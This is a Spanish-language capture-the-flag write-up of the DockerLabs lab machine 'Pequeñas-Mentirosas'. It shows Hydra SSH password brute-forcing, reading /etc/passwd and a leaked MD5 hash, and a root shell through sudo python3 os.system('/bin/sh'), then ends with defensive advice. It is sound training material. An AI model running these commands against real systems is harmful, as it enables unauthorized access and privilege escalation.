# Pequeñas-Mentirosas — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** beafn28  
**Fecha de creación:** 26/09/2024  
**Técnicas:** Hydra · Hash Cracking · SSH · Enumeración de archivos · Python sudo abuse · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web y acceso SSH](#2-enumeración-web-y-acceso-ssh)
3. [Enumeración de archivos sensibles](#3-enumeración-de-archivos-sensibles)
4. [Cracking de hash — usuario Spencer](#4-cracking-de-hash--usuario-spencer)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh pequenas-mentirosas.tar
```

> IP asignada: `172.17.0.2`

Comprobamos conectividad:

```bash
ping -c 4 172.17.0.2
```

Realizamos un escaneo inicial:

```bash
nmap -Pn 172.17.0.2
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

Enumeramos versiones:

```bash
nmap -p22,80 -sCV -Pn 172.17.0.2
```

Servicios detectados:

```text
OpenSSH 9.2p1
Apache httpd 2.4.62
```

---

## 2. Enumeración web y acceso SSH

Accedemos al servidor web.

La página muestra la siguiente pista:

```text
Pista: Encuentra la clave para A en los archivos.
```

Probamos fuerza bruta contra el usuario `a`:

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```

Resultado:

```text
login: a
password: secret
```

Accedemos mediante SSH:

```bash
ssh a@172.17.0.2
```

---

## 3. Enumeración de archivos sensibles

Listamos usuarios del sistema:

```bash
cat /etc/passwd
```

Encontramos:

```text
spencer
a
```

Exploramos archivos interesantes:

```bash
cd /srv
ls
```

Dentro del directorio FTP encontramos:

```bash
cd ftp
ls
```

Archivos relevantes:

```text
hash_spencer.txt
pista_fuerza_bruta.txt
```

Leemos la pista:

```bash
cat pista_fuerza_bruta.txt
```

Contenido:

```text
Realiza un ataque de fuerza bruta para descubrir la contraseña de spencer...
```

Leemos el hash:

```bash
cat hash_spencer.txt
```

Resultado:

```text
7c6a180b36896a0a8c02787eeafb0e4c
```

---

## 4. Cracking de hash — usuario Spencer

Desciframos el hash utilizando CrackStation o fuerza bruta.

Resultado:

```text
password1
```

También es posible encontrar la contraseña mediante Hydra:

```bash
hydra -l spencer -P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```

Accedemos al usuario:

```bash
su spencer
```

Comprobamos permisos sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/python3
```

---

## 5. Escalada de privilegios

Ejecutamos Python como root:

```bash
sudo python3
```

Dentro de la consola Python ejecutamos:

```python
import os
os.system("/bin/sh")
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Contraseña débil SSH | Acceso inicial |
| Archivos sensibles expuestos | Filtración de hashes |
| Hash crackeable | Movimiento lateral |
| Python ejecutable con sudo | Escalada a root |

**Para defenderse:**

- Utilizar contraseñas robustas.
- No almacenar hashes accesibles para usuarios no privilegiados.
- Restringir permisos sobre directorios compartidos.
- Evitar binarios peligrosos ejecutables mediante sudo.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
